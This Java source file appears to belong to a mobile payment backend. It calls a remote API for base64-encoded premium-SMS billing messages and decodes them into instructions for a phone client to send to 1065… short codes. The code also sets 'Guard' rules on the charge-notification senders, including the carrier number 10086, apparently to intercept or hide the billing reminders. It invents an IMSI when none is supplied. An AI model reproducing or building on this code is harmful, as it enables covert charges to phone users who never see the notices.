package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import sun.misc.BASE64Decoder;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.synch.handler.DuohSyncHandler;
import com.jxt.synch.pojo.DuohSync;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * A、请求注册短信

http://115.29.5.18:8091/mj/synclogin.php?imsi=460000552781493&imei=357656050616158&key=a03a3d22f191d5e08acbe956f7c3ccac

参数名	参数类型	参数说明
 imsi	String	手机IMSI （15字节，必填）
 imei	String	手机IMEI。（15字节，必填）
 key String    加密验证  $key =MD5($imsi.substr($imsi, 0,5).'mj');
 【例 imsi=460000552781493   key=MD5(46000055278149346000mj)】


返回状态：
{"sms0to":"","status_code":"1","sms0data64":"","imsi":"460000552781493"}

{"sms0to":"10658422","status_code":"0","sms0data64":"QlVCQFR8QDIgODg5OUFlYU5BQDRXZ2dlaWFAYVBpMzZhUDYxQDg2NTg2MDY5QDg4ODg5OTg5OTVANkAxOTY1Njk2NTg4NjY3NzVANjM5NzBAOTQ5MTI2ODU1ODg4NA==","imsi":"460000552781491"}

参数说明：
参数名	参数类型	参数说明
 status_code	String	接口状态码（必填），0：需要发送 1：无需发送
 imsi String	手机IMSI （15字节，必填）
 sms0to	String	注册短信发送号码。
 sms0data64  String   注册短信内容，BASE64编码，终端需BASE64解码后发送


B、短信发送确认接口
http://115.29.5.18:8091/mj/syncnotify.php?imsi=460000552781493&key=a03a3d22f191d5e08acbe956f7c3ccac


参数名	参数类型	参数说明
 imsi	String	手机IMSI （15字节，必填）
 key String    加密验证  $key =MD5($imsi.substr($imsi, 0,5).'mj');

返回状态：
{"status_code":"0"} 

参数说明：
参数名	参数类型	参数说明
 status_code	String	接口状态码。（可忽略） 



C、请求计费短信

http://115.29.5.18:8091/mj/synccode.php?imsi=460000552781493&imei=357656050616158&chcode=88CS&toolcode=2&key=a03a3d22f191d5e08acbe956f7c3ccac

参数名	参数类型	参数说明
 imsi	String	手机IMSI。(15字节，必填)
 chcode String  渠道代码 （由我方分配，必填）
 toolcode  String	道具代码（由我方分配，必填）。
 imei	String	手机IMEI。   
 network		String	手机网络状态
 phoneBrand	String	手机品牌   
 phoneModel String	手机型号  
 os String	手机Android版本 
 key String    加密验证  $key =MD5($imsi.substr($imsi, 0,5).'mj');


返回状态：
{"status_code":"0","sms0to":"","sms0data64":"","sms1to":"1065889923","sms1data64":"OjpwSFJwOnpbOTJqKldbMjo6VmZYb1s6OkxpOnY6fFRvKT4kOjo6Ojk6ZVAyOlsncFYmOjpkK1JERG9XP3pcNls6V1dwY0F9flIoSCwtKDExc1Q6SmM6cjo6PTo6anBXPHBAWDk\/MmsvajlkeCctQDBuZV4lQn0xdUAiX1RiZmwwQjdJaWRb","sms2from":"1065889955","sms2data64":"5Lit5Zu96bq75bCG","sms3from":"10086","sms3data64":"5ri45oiP","valid_time":"2014-09-23 14:05:12.0","linkid":"98e1521d1ed06cebbcfffd4f19aed510","userId":"298467159","imsi":"460000552781493"}


参数名	参数类型	参数说明
 status_code	String	接口状态码。0:已生成 1:等待（n秒后根据sequenceid再调此接口查询 其它：错误）
 	2001 业务总量超限
 	2002 业务分省总量超限
 	2003 渠道总量超限
	2004 道具总量超限
 	2005  黑名单
 	2006 未授权道具
 	3001   业务暂停
 	3002 业务分省限制
 	3003 渠道总量限制
 	3004   道具总量限制
	3005 用户超日限
	3006 用户超月限
	9999 key加密错误
 imsi	String	手机IMSI。
 sms1to	String	计费sms发送号码。
 sms1data64	String	计费sms内容，BASE64编码，需要BASE64解码后再发送此短信
 valid_time String 在此日期前有效。请同 0.pool.ntp.org 对时，北京时间。在这个时间之外，基本就会失效，不要发送，请重新申请。(服务器时间+4.5分钟)
 sms2from	String	扣费提醒返回短信的号码。//一般扣费成功用户会收到两条提醒短信
 sms2data64	String	扣费提醒1内容，BASE64编码
 sms3from	String	扣费提醒返回短信的号码。
 sms3data64	String	扣费提醒2内容，BASE64编码
 sms0to	String	注册短信发送号码。
 sms0data	String	注册短信内容，终端可直接发送此短信(无需解码)
 sms0data64  String   注册短信内容，BASE64编码，终端需BASE64解码后发送
 userId  String        用户伪码
 linid  计费订单

//如果有返回注册短信，必须在计费短信之前1分钟（暂定）发送，并调用4.2接口通知发送成功



提供一个接口 在订单扣费后会post 以下格式数据。
计费结果

			 <?xml version=\"1.0\" encoding=\"UTF-8\"?><request>
			 <userId>298467159</userId>
			 <toolname>10金币</toolname>
			 <hRet>0</hRet>
			 <status>1800</status>
			 <point>100</point>
			 <time>2014-09-22 04:49:00</time>
			 <linkid>98e1521d1ed06cebbcfffd4f19aed510</linkid>
			 <region>250</region>
			 </request>

 userId  String        用户伪码
 linid  计费订单
toolname 道具名
hRet  0为成功
status  状态值
point  金额
time  时间
region 省份代码

 * @author leoliu
 *
 */
public class DuohDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(DuohDynamicService.class);
	
	private static final String TYPE = "duoh";
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	private static final String THENO_3 = "3";
	
	private static final String FIRSTREQUESTMODEL = "imsi={imsi}&imei={imei}&key={key}";
	private static final String SECONDREQUESTMODEL = "imsi={imsi}&key={key}";
	private static final String THIRDREQUESTMODEL = "imsi={imsi}&imei={imei}&chcode={chcode}&toolcode={toolcode}&key={key}";
	
	private static final String STATUS_CODE_NEED = "0";
	private static final String STATUS_CODE_NONEED = "1";
	
	private static final String STATUS_WAIT = "1";
	private static final String STATUS_SUCC = "0";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 30;
	
	private int timeOut = 60;
	
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}else if(THENO_3.equals(theNo)){
			return thirdDynamic(map);
		}
		
		return null;
	}
	
	private Map<String, Integer> map1 = new HashMap<String, Integer>();
	
	private String firstDynamic(Map<String, String> map){
		
		String url = map.get("url");
		String xml = null;
		
		if(url != null && url.length() > 0){
			
			String mobileId = map.get("mobileId");
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String md5Key = map.get("md5Key");
			
			if(imsi == null || imsi.length() == 0){
				imsi = generateImsi(mobileId);
			}
			
			String key = generateKey(imsi, md5Key);
			
			String firstRequestParam = FIRSTREQUESTMODEL.replace("{imsi}",imsi).replace("{imei}",imei).replace("{key}",key);
			
			String responseJson = GetData.getData(url,firstRequestParam);
			
			xml = parseFirst(responseJson);
			
			String cpparam = map.get("channel");
			
			if(xml == null){
				Integer cnt = map1.get(cpparam);
				
				if(cnt == null){
					cnt = 0;
				}
				
				if(cnt >= 3){
					map1.remove(cpparam);
					xml = DynamicUtils.parseError("598");
				}else{
					cnt ++;
					map1.put(cpparam, cnt);
					
					xml = DynamicUtils.parseWait(map);//获取失败
				}
			}else{
				map1.remove(cpparam);
			}
		}
		
		return xml;
	}

	private String parseFirst(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
		
			System.out.println("responseJson1 : "+responseJson);
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status_code = jo.getString("status_code");
				
				if(STATUS_CODE_NEED.equals(status_code)){
					String sms0to = jo.getString("sms0to");
					String sms0data64 = jo.getString("sms0data64");
					
					String msgContent = CommonUtil.base64Decode(sms0data64.replaceAll(" ","+"));
					
					Sms sms = new Sms();
					sms.setSmsContent(msgContent);
					sms.setSmsDest(sms0to);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					return XstreamHelper.toXml(sms).append("<wait>10</wait>").toString();
				}else{
					return "<wait>1</wait>";
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String secondDynamic(Map<String, String> map){
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			
			String mobileId = map.get("mobileId");
			String imsi = map.get("imsi");
			String md5Key = map.get("md5Key");
			
			if(imsi == null || imsi.length() == 0){
				imsi = generateImsi(mobileId);
			}
			
			String key = generateKey(imsi, md5Key);
		
			String secondRequestParam = SECONDREQUESTMODEL.replace("{imsi}", imsi).replace("{key}",key);
			
			String responseJson = GetData.getData(url, secondRequestParam);
			
			return "<wait>1</wait>";
		}
		
		return null;
	}

	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	private String thirdDynamic(Map<String, String> map){
	
		String url = map.get("url");
		String xml = null;
		
		String cpparam = map.get("channel");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(cpparam);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(cpparam,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(cpparam);
					return DynamicUtils.parseError("599");
				}
			}
			
			String mobileId = map.get("mobileId");
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String md5Key = map.get("md5Key");
			String chcode = map.get("chcode");
			String toolcode = map.get("toolcode");
			
			if(imsi == null || imsi.length() == 0){
				imsi = generateImsi(mobileId);
			}
			
			String key = generateKey(imsi, md5Key);
		
			String requestParam = THIRDREQUESTMODEL.replace("{imei}", imei).replace("{imsi}",imsi).replace("{chcode}", chcode);
			requestParam = requestParam.replace("{toolcode}", toolcode).replace("{key}",key);
			
			String responseJson = GetData.getData(url, requestParam);
			
			System.out.println("responseJson3 : "+responseJson);
			
			xml = parseThird(map,responseJson);
		}
	
		if(xml == null){
			xml = DynamicUtils.parseWait(10,map);//获取失败
		}
		
		return xml;
	}
	
	private String parseThird(Map<String, String> map,String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String sms0to = jo.getString("sms0to");
				
				String status_code = jo.getString("status_code");
				String userId = jo.getString("userId");
				
				if(STATUS_WAIT.equals(status_code) || userId == null || userId.length() == 0){
					return DynamicUtils.parseWait(10,map);
				}else{
					tryMap.remove(map.get("channel"));
				
					if(STATUS_SUCC.equals(status_code)){//完成
						return parseThirdSucc(map,jo);
					}else{
						return DynamicUtils.parseError(status_code);
					}
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String parseThirdSucc(Map<String, String> map,JSONObject jo){
		
		try {
			String userId = jo.getString("userId");
			
//			if(userId == null || userId.length() == 0){//第一条实际没有发送
//				return DynamicUtils.parseError("594");
//			}
			
			String sms1to = jo.getString("sms1to");
			String sms1data64 = jo.getString("sms1data64");
			String sms1Data = CommonUtil.base64Decode(sms1data64.replaceAll(" ","+"));
		
			String sms2from = jo.getString("sms2from");
			String sms2data64 = jo.getString("sms2data64");
			String sms2Data = CommonUtil.base64Decode(sms2data64.replaceAll(" ","+"));
			
			String sms3from = jo.getString("sms3from");
			String sms3data64 = jo.getString("sms3data64");
			String sms3Data = CommonUtil.base64Decode(sms3data64.replaceAll(" ","+"));
			
			
			String linkid = jo.getString("linkid");
			String channel = map.get("channel");
			
			saveDuohSync(userId,linkid,channel);
			
			List<Sms> list = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			sms.setSmsDest(sms1to);
			sms.setSmsContent(sms1Data);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(new Guard(sms2from, sms2Data, 2880, "1", 0));
			guardList.add(new Guard(sms3from, sms3Data, 2880, "0", 0));
			guardList.add(new Guard(sms2from, "", 960, "0", 1));
			guardList.add(new Guard(sms3from, "", 960, "0", 1));
			
			guardSms.setGuardList(guardList);
			
			list.add(guardSms);
			list.add(sms);
			
			return XstreamHelper.toXml(list);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return null;
	}
	
	private void saveDuohSync(String userId,String linkId,String channel){
		if(duohSyncHandler != null){
			try{
				DuohSync duohSync = new DuohSync();
				duohSync.setChannel(channel);
				duohSync.setLinkId(linkId);
				duohSync.setWeima(userId);
				
				duohSyncHandler.save(duohSync);
			}catch(Exception e){
				e.printStackTrace();
			}
		}
	}
	
	private static String generateImsi(String mobileId){
		StringBuffer sb = new StringBuffer("A");
		
		sb.append(mobileId).append("000000000000000");
		
		return sb.substring(0,15);
	}
	
	private static String generateKey(String imsi,String md5Key){
		return MD5Encrypt.MD5Encode(imsi+imsi.substring(0,5)+md5Key).toLowerCase();
	}
	
	//IOC
	private DuohSyncHandler duohSyncHandler;
	
	public void setDuohSyncHandler(DuohSyncHandler duohSyncHandler) {
		this.duohSyncHandler = duohSyncHandler;
	}

	public static void main(String[] args){
		
		test3();
		
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		map.put("imsi","460028174282753");
		map.put("imei","869460011612203");
		map.put("md5Key","sg");
		map.put("channel","100001a010000005");
		map.put("mobileId","2892");
		map.put("url","http://115.29.5.18:8091/sg/synclogin.php");
		map.put("theNo","1");
		
		System.out.println(new DuohDynamicService().dynamic(map));
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		map.put("imsi","460028174282753");
		map.put("md5Key","sg");
		map.put("mobileId","2892");
		map.put("url","http://115.29.5.18:8091/sg/syncnotify.php");
		map.put("theNo","2");
		
		System.out.println(new DuohDynamicService().dynamic(map));	
	}
	
	private static void test3(){
//		ClassPathXmlApplicationContext ctx = new ClassPathXmlApplicationContext(new String[]{"classpath:ApplicationContext_Test.xml"});
		
		Map<String, String> map = new HashMap<String, String>();
		map.put("imsi","460028174282753");
		map.put("imei","869460011612203");
		map.put("md5Key","sg");
		map.put("mobileId","2892");
		map.put("url","http://115.29.5.18:8091/sg/synccode.php");
		map.put("chcode","88LX");
		map.put("toolcode","23");
		map.put("channel","100001a010000004");
		map.put("theNo","3");
		
		DuohDynamicService duohDynamicService = new DuohDynamicService(); 
//				(DuohDynamicService)ctx.getBean("duohDynamicService");
		
		System.out.println(duohDynamicService.dynamic(map));	
	}
}
